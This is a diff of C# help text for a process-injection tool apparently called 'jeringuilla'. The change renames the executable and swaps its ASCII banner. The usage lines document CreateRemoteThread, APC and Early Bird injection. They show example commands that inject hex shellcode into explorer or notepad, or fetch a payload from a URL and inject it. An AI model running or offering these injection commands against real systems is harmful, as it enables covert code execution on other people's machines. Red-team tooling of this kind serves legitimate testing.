@@ -387,38 +387,38 @@ namespace jeringuilla
 
         static void getHelp()
         {
-            Console.WriteLine("    _           _                   \r\n   (_)         (_)                  \r\n    _  ___ _ __ _ _ __   __ _  __ _ \r\n   | |/ _ \\ '__| | '_ \\ / _` |/ _` |\r\n   | |  __/ |  | | | | | (_| | (_| |\r\n   | |\\___|_|  |_|_| |_|\\__, |\\__,_|\r\n  _/ |                   __/ |      \r\n |__/                   |___/     \n\n");
+            Console.WriteLine("       _           _                   _ _ _       \r\n      | |         (_)                 (_) | |      \r\n      | | ___ _ __ _ _ __   __ _ _   _ _| | | __ _ \r\n  _   | |/ _ \\ '__| | '_ \\ / _` | | | | | | |/ _` |\r\n | |__| |  __/ |  | | | | | (_| | |_| | | | | (_| |\r\n  \\____/ \\___|_|  |_|_| |_|\\__, |\\__,_|_|_|_|\\__,_|\r\n                            __/ |                  \r\n                           |___/        \n\n");
 
             Console.WriteLine("[+] Option \"list\" to  enumerate all processes or filter by name or owner.\n");
-            Console.WriteLine("jeringa.exe list [ all | PROCESS_NAME | PROCESS_OWNER]\r\n");
+            Console.WriteLine("jeringuilla.exe list [ all | PROCESS_NAME | PROCESS_OWNER]\r\n");
             Console.WriteLine("[*] Example - List all processes:");
-            Console.WriteLine("jeringa.exe list all");
+            Console.WriteLine("jeringuilla.exe list all");
             Console.WriteLine("[*] Example - List processes with a specific name (\"explorer\") or process owner (\"DESKTOP-MA54241\\ricardo\"):");
-            Console.WriteLine("jeringa.exe list explorer\r\njeringa.exe list \"DESKTOP-MA54241\\ricardo\"");
+            Console.WriteLine("jeringuilla.exe list explorer\r\njeringuilla.exe list \"DESKTOP-MA54241\\ricardo\"");
             Console.WriteLine(string.Concat(Enumerable.Repeat("-", 100)));
 
             Console.WriteLine("[+] Injection \"inject-crt\" (OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)\n");
-            Console.WriteLine("jeringa.exe inject-crt [(PROCESS_NAME PROCESS_OWNER) | PROCESS_PID] [ HEX_PAYLOAD | URL]\r\n");
+            Console.WriteLine("jeringuilla.exe inject-crt [(PROCESS_NAME PROCESS_OWNER) | PROCESS_PID] [ HEX_PAYLOAD | URL]\r\n");
             Console.WriteLine("[*] Example - Injection using process name, process owner and payload in HEX format:");
-            Console.WriteLine("jeringa.exe inject-crt explorer \"DESKTOP-MA54241\\ricardo\" fc4883e4f0e8...");
+            Console.WriteLine("jeringuilla.exe inject-crt explorer \"DESKTOP-MA54241\\ricardo\" fc4883e4f0e8...");
             Console.WriteLine("[*] Example - Injection using PID (\"1234\") and a url to download the payload:");
-            Console.WriteLine("jeringa.exe inject-crt 1234 http://127.0.0.1/payload.bin");
+            Console.WriteLine("jeringuilla.exe inject-crt 1234 http://127.0.0.1/payload.bin");
             Console.WriteLine(string.Concat(Enumerable.Repeat("-", 100)));
 
             Console.WriteLine("[+] Injection \"inject-apc\" (OpenProcess + VirtualAllocEx + WriteProcessMemory + OpenThread + QueueUserAPC)\n");
-            Console.WriteLine("jeringa.exe inject-apc [(PROCESS_NAME PROCESS_OWNER) | PROCESS_PID] [ HEX_PAYLOAD | URL]\r\n");
+            Console.WriteLine("jeringuilla.exe inject-apc [(PROCESS_NAME PROCESS_OWNER) | PROCESS_PID] [ HEX_PAYLOAD | URL]\r\n");
             Console.WriteLine("[*] Example - Injection using process name, process owner and payload in HEX format:");
-            Console.WriteLine("jeringa.exe inject-apc explorer \"DESKTOP-MA54241\\ricardo\" fc4883e4f0e8...");
+            Console.WriteLine("jeringuilla.exe inject-apc explorer \"DESKTOP-MA54241\\ricardo\" fc4883e4f0e8...");
             Console.WriteLine("[*] Example - Injection using PID (\"1234\") and a url to download the payload:");
-            Console.WriteLine("jeringa.exe inject-apc 1234 http://127.0.0.1/payload.bin");
+            Console.WriteLine("jeringuilla.exe inject-apc 1234 http://127.0.0.1/payload.bin");
             Console.WriteLine(string.Concat(Enumerable.Repeat("-", 100)));
 
             Console.WriteLine("[+] Injection \"earlybird\" (CreateProcess + VirtualAllocEx + WriteProcessMemory + ResumeThread)\n");
-            Console.WriteLine("jeringa.exe earlybird PROGRAM_PATH [ HEX_PAYLOAD | URL]\r\n");
+            Console.WriteLine("jeringuilla.exe earlybird PROGRAM_PATH [ HEX_PAYLOAD | URL]\r\n");
             Console.WriteLine("[*] Example - Injection using program path and payload in HEX format:");
-            Console.WriteLine("jeringa.exe earlybird \"c:\\windows\\system32\\notepad.exe\" fc4883e4f0e8...");
+            Console.WriteLine("jeringuilla.exe earlybird \"c:\\windows\\system32\\notepad.exe\" fc4883e4f0e8...");
             Console.WriteLine("[*] Example - Injection using program path and a url to download the payload:");
-            Console.WriteLine("jeringa.exe earlybird \"c:\\windows\\system32\\calc.exe\" http://127.0.0.1/payload.bin");
+            Console.WriteLine("jeringuilla.exe earlybird \"c:\\windows\\system32\\calc.exe\" http://127.0.0.1/payload.bin");
             Console.WriteLine(string.Concat(Enumerable.Repeat("-", 100)));
 
             Console.WriteLine("[+] Payload generation\n");
